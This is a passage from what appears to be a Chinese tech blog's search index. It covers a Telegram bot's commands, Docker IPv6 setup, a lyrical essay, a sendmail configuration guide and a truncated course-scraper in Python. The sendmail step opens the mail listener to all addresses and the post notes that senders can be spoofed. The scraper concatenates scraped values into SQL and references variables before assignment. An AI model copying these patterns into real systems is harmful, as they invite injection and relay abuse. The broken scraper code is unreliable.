class="line">开启后，可以设置内容</span><br><span class="line">/<span class="built_in">set</span>/goodbyetext <span class="variable">$username</span>离开了我们群</span><br></pre></td></tr></table></figure><blockquote><p>注意：加群欢迎和退群欢送文字默认开启markdown语法</p></blockquote><h2 id="命令列表"><a href="#命令列表" class="headerlink" title="命令列表"></a>命令列表</h2><ul><li>help - 查看帮助</li><li>add - 添加规则</li><li>del - 删除规则</li><li>list - 列出规则</li><li>admin - 呼叫管理员</li><li>banme - 禁言小游戏</li><li>getid - 查看用户的信息 可回复查看别人</li><li>autoreply - 开关自动回复功能</li><li>autodelete - 开关自动删除消息功能</li><li>replyorder - 开关回复ban/kick命令功能</li><li>banmegame - 开关禁言小游戏功能</li><li>playorderban - 开关玩命令惩罚功能</li><li>banqingzhen - 开关防清真功能</li><li>calladmin - 开关呼叫管理员功能</li><li>welcome - 开关加群欢迎功能</li><li>goodbye - 开关离群送别功能</li><li>deletejoinmessage - 开关删除加群消息功能</li><li>servicelist - 查看机器人功能列表</li><li>deleteallrules - 清空本群所有关键词规则</li><li>deleteallmessage - 删除48小时内所有消息</li></ul><h2 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h2><p>开源地址： <a href="https://github.com/zu1k/tg-keyword-reply-bot" target="_blank" rel="noopener">https://github.com/zu1k/tg-keyword-reply-bot</a></p><h2 id="赞助"><a href="#赞助" class="headerlink" title="赞助"></a>赞助</h2><blockquote><p>这里要特别感谢 聪聪，是他赞助了服务器费用。<br>聪聪大佬是tg上 印象笔记群组 的创建者，他的群组和频道是tg上中文交流（不讨论政治、色情、黑产）的一个不错的地方，推荐刚刚开始使用tg的同学加入。<br>聪聪的群组 @yxbjx<br>聪聪的频道 @YinxiangBiji_News</p></blockquote><p>如果你认为这个机器人为你管理群组提供了帮助，那么期待你的赞助，你的赞助可以帮助机器人运行更长时间，同时你的名字也会被记录到机器人开源页。</p><h3 id="如何赞助"><a href="#如何赞助" class="headerlink" title="如何赞助"></a>如何赞助</h3><p>一共有两种方式可以给这个机器人提供赞助</p><ul><li>通过购买虚拟卡片，<a href="https://www.kuaifaka.com/purchasing?link=peekfun" target="_blank" rel="noopener">在线购买</a></li><li>通过邮箱联系我，然后索要我的赞赏码或者其他收款方式</li></ul><h2 id="问题反馈"><a href="#问题反馈" class="headerlink" title="问题反馈"></a>问题反馈</h2><p>目前有效的反馈方式是github上的 <a href="https://github.com/zu1k/tg-keyword-reply-bot/issues" target="_blank" rel="noopener">Issue页面</a> ，目前仅支持闭源版本问题反馈，反馈时请一次性描述清楚，必要时请附加截图，这样有利于更好的解决问题。</p><p>如果是增加特定功能就不要反馈了，如有需求可以找我或别人定制特定的机器人。</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> telegram </tag>
            
            <tag> bot </tag>
            
            <tag> tgbot </tag>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给docker里的每一个容器一个独立的ipv6地址</title>
      <link href="/2019/set-ipv6-for-every-docker-container.html"/>
      <url>/2019/set-ipv6-for-every-docker-container.html</url>
      
        <content type="html"><![CDATA[<p>ipv6不断普及，ipv6地址多的数不胜数，机房给单台机器分配的ipv6段达到了可怕的64位长度的子网主机号。</p><p>那我不禁在想，能不能给docker下的每个容器独立的ipv6地址，这样就不需要映射端口号了。</p><p>所以就有了以下实践：</p><p>首先，给docker engine开启ipv6支持, 参考： <a href="https://docs.docker.com/config/daemon/ipv6/" target="_blank" rel="noopener">https://docs.docker.com/config/daemon/ipv6/</a></p><p>配置/etc/docker/daemon.json文件如下。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"ipv6"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"fixed-cidr-v6"</span>: <span class="string">"2001:1234:5001:1234::/64"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行 <code>systemctl reload docker</code> 重载Docker Engine的配置文件</p><p>这样docker默认的bridge网络就会给容器分配随机的ipv6地址了。</p><p>但是我们通常需要固定的ipv6地址，所以需要添加自定义网桥网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker network create \</span><br><span class="line">    -d bridge --ipv6 \</span><br><span class="line">    --subnet "2001:1234:5001:1234:6666::/80" \</span><br><span class="line">    --gateway="2001:1234:5001:1234:6666::1" \</span><br><span class="line">    --subnet=172.28.0.0/16 \</span><br><span class="line">    --gateway=172.28.0.1 ipv6</span><br></pre></td></tr></table></figure><p>然后启动docker容器时候指定ipv6网桥和ipv6地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -P --ip=172.28.0.101 \</span><br><span class="line">    --ip6="2001:1234:5001:1234:6666::101" \</span><br><span class="line">    --network=ipv6 \</span><br><span class="line">    --name=ipv6test \</span><br><span class="line">    ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure><p>此时容器已经有独立的ipv6地址了，我们发现向外访问可以访问，但是外界访问不到docker后面隐藏的container<br>这是因为ipv6使用NDP协议，我们需要在容器的宿主机上设置 ndp代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl net.ipv6.conf.ens3.proxy_ndp=1</span><br></pre></td></tr></table></figure><blockquote><p>ens3是我的宿主机外网网卡，这里需要替换成你自己的</p></blockquote><p>这里每一个docker分配的ipv6地址都需要添加这样一条规则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip -6 neigh add proxy 2001:1234:5001:1234:6666::101 dev ens3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> ipv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生若只如初见</title>
      <link href="/2018/if-time-could-stop-at-the-moment-when-we-first-met.html"/>
      <url>/2018/if-time-could-stop-at-the-moment-when-we-first-met.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>木兰花令——人生若只如初见<br>纳兰性德<br>人生若只如初见，何事秋风悲画扇。<br>等闲变却故人心，却道故人心易变。<br>骊山语罢清宵半，泪雨零铃终不怨。<br>何如薄幸锦衣郎，比翼连枝当日愿。</p></blockquote><a id="more"></a><p>网上看到一篇散文，很喜欢，就摘了过来。</p><p>人生若只如初见，所有往事都化为江南的一场烟雨，在相视一笑中，随风荡漾起回忆的波纹，然后再渐渐隐去在画中的江南，只因为你的离去，我竟为你留下的惊艳，倾情伤怀。</p><p>时光太匆匆，我们总也回不到过去，也许曾一见倾心，但再见之时，也许，是伤心之时。若是如此，在那分离的一刻，我怎么也不会让你离去，怎么也不会让定格在唯美初遇的时光流逝，我只期望那一刻可以定格一万年。</p><p>初见惊艳，再见依然，这只是一个美好的愿望，蓦然回首，曾经沧海桑田，早已换了人间，再也寻不到灯火阑珊处那一抹清纯的微笑。</p><p>人生若只如初见，何事秋风悲画屏？等闲变却故人心，却道故人心易变，骊山语罢消宵半，夜雨零铃终不怨，何如薄幸锦儿衣，比翼连理当日愿。纳兰长于情，深于情，直抒无奈忧郁情，我的伤心又怎不是因情而起？</p><p>人生若只如初见该多好，让那种自然，那种回忆，那种真诚，一直弥漫在生命之中，该多好啊。为什么人与人之间会有误会，会有费解，会有猜测和非议呢？为什么还有冷落，争吵和疏远呢？为什么？</p><p>初遇是一场美丽的梦，美丽的梦和美丽的诗一样，都是可遇而不可求的，常常在最没料想到的时刻出现，在最没料想到的时刻消失。</p><p>在这场不该有我的梦里，我依然在期盼，一切可以重新开始，一切都可以慢慢解释，想象之中还能再回到初遇时的欣喜和感动。在梦里你依然如故，在我眼前，你的微笑，一如那年那月那时那分那秒，依旧让我那么心动。</p><p>每个人都会有初遇的情结，像一杯清水那般清纯透明，透明中包含着一种叫做永不会再来的幸福，稍纵即逝，有的人拼命的想抓住，拼命的追寻，可他还是如烟随风，轻轻流逝再也不见了，初遇的情怀，是一场淡淡的清风，太过执着了，便迷失了自己，惹一世的忧伤。让他自由吧，只留一丝在梦里，安慰曾经渴望的心。</p><p>有一种情怀你不会明白，你永远明白不了，因为它是属于我自己的，也许你我仅仅错过了一秒，就已注定已错过了今生。</p><p>人生若只如初见，忧伤的美丽只能注定定格在回忆中。也许哪天，转身而去，留下一个美丽远去的背影，完美的弧线，会诉说着对昨天依恋。</p><p>人生若只如初见，不舍的眼眸只为停留在离去的那刻，也许哪天你出现在我的梦里。倾城的微笑，会解释着那些年的思念。</p><p>人生如此，浮生若萍，相逢情缘深？相恋情缘浅！辗转一季花开花落，不变的容颜下，是否还有一颗不曾改变的心？情生情死若一场烟花雨，最终还是不见了踪影。初遇时情真至深，再见时，唯有一滴伤心断肠泪，一抹忧伤忘怀笑。擦肩而过，回头看，不曾见。来时伴……</p>]]></content>
      
      
      
        <tags>
            
            <tag> 好文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过Sendmail服务发送邮件</title>
      <link href="/2018/send-mail-via-endmail-service.html"/>
      <url>/2018/send-mail-via-endmail-service.html</url>
      
        <content type="html"><![CDATA[<p>通过Sendmail服务发送邮件</p><p>系统centos7</p><p>需要开启25端口</p><a id="more"></a><h3 id="安装sendmail"><a href="#安装sendmail" class="headerlink" title="安装sendmail"></a>安装sendmail</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum  -y  install sendmail  sendmail-cf</span><br></pre></td></tr></table></figure><h3 id="安装MTA功能测试用软件"><a href="#安装MTA功能测试用软件" class="headerlink" title="安装MTA功能测试用软件"></a>安装MTA功能测试用软件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install  mailx   php</span><br></pre></td></tr></table></figure><h3 id="切换系统的邮件发送接口"><a href="#切换系统的邮件发送接口" class="headerlink" title="切换系统的邮件发送接口"></a>切换系统的邮件发送接口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alternatives --config mta</span><br></pre></td></tr></table></figure><p>画面显示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">There are 2 programs which provide 'mta'.</span><br><span class="line"></span><br><span class="line">Selection    Command</span><br><span class="line">-----------------------------------------------</span><br><span class="line">+ 1           /usr/sbin/sendmail.postfix</span><br><span class="line">*  2           /usr/sbin/sendmail.sendmail</span><br><span class="line"></span><br><span class="line">Enter to keep the current selection[+], or type selection number: 2</span><br></pre></td></tr></table></figure><p>输入2后回车即把MTA功能切换到sendmail上，+号会显示在sendmail的行头。</p><h3 id="配置sendmail"><a href="#配置sendmail" class="headerlink" title="配置sendmail"></a>配置sendmail</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/mail/sendmail.mc</span><br><span class="line"></span><br><span class="line">DAEMON_OPTIONS(\`Port=smtp,Addr=127.0.0.1, Name=MTA\')dnl</span><br><span class="line"></span><br><span class="line">把Addr的值从127.0.0.1修改为0.0.0.0，不限制使用MTA的IP。</span><br><span class="line"></span><br><span class="line">m4 /etc/mail/sendmail.mc &gt; /etc/mail/sendmail.cf</span><br><span class="line">生成正式的配置文件。</span><br></pre></td></tr></table></figure><h3 id="重启并测试功能"><a href="#重启并测试功能" class="headerlink" title="重启并测试功能"></a>重启并测试功能</h3><p><code>reboot -f</code></p><p>重启完成后确认MTA程序已经切换到sendmail</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep sendmail</span><br><span class="line"></span><br><span class="line">      root       1003  0.0  0.2  88688  2280 ?        Ss   10:40   0:00 sendmail: accepting connections</span><br><span class="line">      smmsp      1018  0.0  0.1  84120  1912 ?        Ss   10:40   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue</span><br><span class="line">      root       1141  0.0  0.0 112660   968 pts/1    R+   10:51   0:00 grep --color=auto sendmail</span><br><span class="line"></span><br><span class="line">      sendmail的相关进程已经启动</span><br><span class="line"></span><br><span class="line">ps aux | grep postfix</span><br><span class="line"></span><br><span class="line">      root       1161  0.0  0.0 112660   968 pts/1    R+   11:04   0:00 grep --color=auto postfix</span><br><span class="line"></span><br><span class="line">      postfix的相关进程都没有开启</span><br></pre></td></tr></table></figure><h3 id="用PHP函数发送邮件"><a href="#用PHP函数发送邮件" class="headerlink" title="用PHP函数发送邮件"></a>用PHP函数发送邮件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php -a</span><br><span class="line"></span><br><span class="line">在PHP的交互界面下输入以下函数</span><br><span class="line"></span><br><span class="line">mail(<span class="string">'test@sohu.com'</span>, <span class="string">"Test email content"</span>, <span class="string">"sendmail title"</span>, <span class="keyword">null</span>, <span class="string">"-f testname@sendmail.com"</span>);</span><br></pre></td></tr></table></figure><ul><li>使用PHP接口做测试的好处是可以随意指定发送方的邮件地址，即mail函数的最后一个参数。</li></ul><p>即使系统的hostname未设置也可以正常发送出邮件。</p><h3 id="使用linux的mail命令发送邮件"><a href="#使用linux的mail命令发送邮件" class="headerlink" title="使用linux的mail命令发送邮件"></a>使用linux的mail命令发送邮件</h3><p>mail命令就没有使用自定义的邮件发送地址，而是使用HOSTNAME。</p><p>安装系统时由于没有对hostname做特别设置，HOSTNAME的值是默认的 localhost.localdomain</p><p>这样的邮件域名会被大多数邮箱如163，QQ拒收。</p><p>查看邮件发送log会发现以下错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/maillog</span><br><span class="line"></span><br><span class="line">      dsn=4.1.8, stat=Deferred: 450 4.1.8 &lt;root@localhost.localdomain&gt;: Sender address rejected: Domain not found</span><br></pre></td></tr></table></figure><p>修改HOSTNAME</p><p><code>vi  /etc/hosts</code></p><p>在最后加上一行</p><p><code>192.168.2.108  intest.com</code></p><p>这里的IP地址是我跑sendmail虚拟机的IP，需根据实际情况设置</p><ul><li>其实这个文件hosts只是用来设置本地路由表，但填上本机IP时，系统在启动初始化中查到本机IP在hosts中，就会用hosts文件中对应的域名来设置HOSTNAME。</li></ul><p>重新启动</p><p><code>reboot -f</code></p><p>重启后发现本地的DNS配置文件etc/resolv.conf 已经被自动更新。</p><p>内容变成  <code>nameserver 192.168.2.1</code></p><p>执行mail命令发送邮件</p><p><code>echo &quot;test mail content&quot;|mail -s &quot;Mail title&quot; test@sohu.com</code></p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="切换系统的邮件发送接口-1"><a href="#切换系统的邮件发送接口-1" class="headerlink" title="切换系统的邮件发送接口"></a>切换系统的邮件发送接口</h3><p><code>alternatives --config mta</code></p><ul><li>Postfix是Centos7系统默认自带。 也可以用命令 yum list installed | grep postfix 确认</li></ul><p>选择postfix所在行的编号后回车</p><h3 id="重启并测试功能-1"><a href="#重启并测试功能-1" class="headerlink" title="重启并测试功能"></a>重启并测试功能</h3><p><code>reboot -f</code></p><p>重启后查看进程看到postfix相关的进程已经启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep postfix</span><br><span class="line"></span><br><span class="line">      root       1093  0.0  0.2  89544  2172 ?        Ss   08:55   0:00 /usr/libexec/postfix/master -w</span><br><span class="line">      postfix    1094  0.0  0.4  89648  4016 ?        S    08:55   0:00 pickup -l -t unix -u</span><br><span class="line">      postfix    1095  0.0  0.4  89716  4044 ?        S    08:55   0:00 qmgr -l -t unix -u</span><br><span class="line">      postfix    1237  0.0  0.4  89796  4072 ?        S    09:08   0:00 cleanup -z -t unix -u</span><br><span class="line">      postfix    1238  0.0  0.4  89652  4024 ?        S    09:08   0:00 trivial-rewrite -n rewrite -t unix -u</span><br><span class="line">      postfix    1239  0.0  0.4  89856  4272 ?        S    09:08   0:00 smtp -t unix -u</span><br><span class="line">      root       1274  0.0  0.0 112660   972 pts/1    R+   09:09   0:00 grep --color=auto postfix</span><br></pre></td></tr></table></figure><p>系统的hostname已经在sendmail配置的第六步中完成了配置，这里就直接使用PHP与mail命令</p><p>两种方法做测试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -a</span><br><span class="line"></span><br><span class="line">mail('test@sohu.com', "Test email No1", "postfix mail", null, "-f test@ccfst.com");</span><br><span class="line">* php的mail函数可以随意指定发送地址</span><br><span class="line"></span><br><span class="line">echo "test mail"|mail -s "postfix mail title" test@sohu.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mail </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬取教务系统所有课程并存入数据库</title>
      <link href="/2018/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database.html"/>
      <url>/2018/crawl-all-the-courses-of-the-educational-administration-system-and-store-them-in-the-database.html</url>
      
        <content type="html"><![CDATA[<p>环境python3.6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize Session</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">ua = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0"</span>&#125;</span><br><span class="line">s.headers.update(ua)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username = <span class="string">"201700301234"</span></span><br><span class="line">    password = <span class="string">"123456"</span>.encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Get cookies</span></span><br><span class="line">    s.get(<span class="string">"http://bkjwxk.sdu.edu.cn"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set properties to login</span></span><br><span class="line">    hs = hashlib.md5()</span><br><span class="line">    hs.update(password)</span><br><span class="line">    password = hs.hexdigest()</span><br><span class="line">    data = <span class="string">"j_username="</span> + username + <span class="string">"&amp;j_password="</span> + password</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://bkjwxk.sdu.edu.cn/f/login"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded; charset=UTF-8"</span>,</span><br><span class="line">        <span class="string">"X-Requested-With"</span>: <span class="string">"XMLHttpRequest"</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">"http://bkjwxk.sdu.edu.cn/b/ajaxLogin"</span>, data=data, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check if is successful</span></span><br><span class="line">    <span class="keyword">if</span> r.text != <span class="string">"\"success\""</span>:</span><br><span class="line">        print(<span class="string">"登陆出错"</span>)</span><br><span class="line">        print(<span class="string">"Detailed message: "</span>)</span><br><span class="line">        print(r.text)</span><br><span class="line">        sys.exit()</span><br><span class="line">    print(<span class="string">"登陆成功"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get one page data</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">onepage</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = <span class="string">"type=kc&amp;currentPage="</span> + i + <span class="string">"&amp;kch=&amp;jsh=&amp;skxq=&amp;skjc=&amp;kkxsh="</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">        <span class="string">"Referer"</span>: <span class="string">"http://bkjwxk.sdu.edu.cn/f/common/main"</span>,</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded; charset=UTF-8"</span>,</span><br><span class="line">        <span class="string">"X-Requested-With"</span>: <span class="string">"XMLHttpRequest"</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(<span class="string">"http://bkjwxk.sdu.edu.cn/b/xk/xs/kcsearch"</span>, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向数据库插入一条数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insertone</span><span class="params">(index, kch, kxh, kcm, xf, kclb, kclbmc, kkxsh, kkxsm, kkxsjc, jsh, ksm, sjdd)</span>:</span></span><br><span class="line">    <span class="comment"># 打开数据库连接</span></span><br><span class="line">    db = pymysql.connect(<span class="string">"localhost"</span>, <span class="string">"kc"</span>, <span class="string">"kc"</span>, <span class="string">"kc"</span>, charset=<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="comment"># 使用cursor()方法获取操作游标</span></span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="comment"># SQL 插入语句</span></span><br><span class="line">    sql = <span class="string">"INSERT INTO kcinfo(`id`,`kch`,`kxh`,`kcm`,`xf`,`kclb`,`kclbmc`,`kkxsh`,`kkxsm`,`kkxsjc`,`jsh`,`ksm`,`sjdd`) VALUES ('"</span> + index + <span class="string">"','"</span> + kch + <span class="string">"','"</span> + kxh + <span class="string">"','"</span> + kcm + <span class="string">"','"</span> + xf + <span class="string">"','"</span> + kclb + <span class="string">"','"</span> + kclbmc + <span class="string">"','"</span> + kkxsh + <span class="string">"','"</span> + kkxsm + <span class="string">"','"</span> + kkxsjc + <span class="string">"','"</span> + jsh + <span class="string">"','"</span> + ksm + <span class="string">"','"</span> + sjdd + <span class="string">"')"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 执行sql语句</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        <span class="comment"># 提交到数据库执行</span></span><br><span class="line">        db.commit()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(sql)</span><br><span class="line">        <span class="comment"># 如果发生错误则回滚</span></span><br><span class="line">        db.rollback()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">godata</span><span class="params">(i)</span>:</span></span><br><span class="line">    js = onepage(i)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> js[<span class="string">"object"</span>][<span class="string">"resultList"</span>]:</span><br><span class="line">        kch = result[<span class="string">"KCH"</span>] <span class="keyword">if</span> kch <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">""</span>  <span class="comment"># 课程号</span></span><br><span class="line">        kxh = str(result[<span class="string">"KXH"</span>]) <span class="keyword">if</span> kxh <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">""</span>  <span class="comment"># 课序号</span></span><br><span class="line">        kcm = result[<span class="string">"KCM"</span>]  <span class="comment"># 课程名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kcm: kcm = <span class="string">""</span></span><br><span class="line">        xf = str(result[<span class="string">"XF"</span>])  <span class="comment"># 学分</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> xf: xf = <span class="string">"0"</span></span><br><span class="line">        kclb = result[<span class="string">"KCLB"</span>]  <span class="comment"># 课程类别</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kclb: kclb = <span class="string">""</span></span><br><span class="line">        kclbmc = result[<span class="string">"KCLBMC"</span>]  <span class="comment"># 课程类别名称</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kclbmc: kclbmc = <span class="string">""</span></span><br><span class="line">        kkxsh = result[<span class="string">"KKXSH"</span>]  <span class="comment"># 开课学院号</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kkxsh: kkxsh = <span class="string">""</span></span><br><span class="line">        kkxsm = result[<span class="string">"KKXSM"</span>]  <span class="comment"># 开科学院名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kkxsm: kkxsm = <span class="string">""</span></span><br><span class="line">        kkxsjc = result[<span class="string">"KKXSJC"</span>]  <span class="comment"># 开课学院简称</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> kkxsjc: kkxsjc = <span class="string">""</span></span><br><span class="line">        jsh = str(result[<span class="string">"JSH"</span>])  <span class="comment"># 教师号</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> jsh: jsh = <span class="string">"0"</span></span><br><span class="line">        ksm = result[<span class="string">"JSM"</span>]  <span class="comment"># 教师名</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ksm: ksm = <span class="string">""</span></span><br><span class="line">        sjdd = result[<span class="string">"SJDD"</span>]  <span class="comment"># 上课时间/地点</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sjdd: sjdd = <span 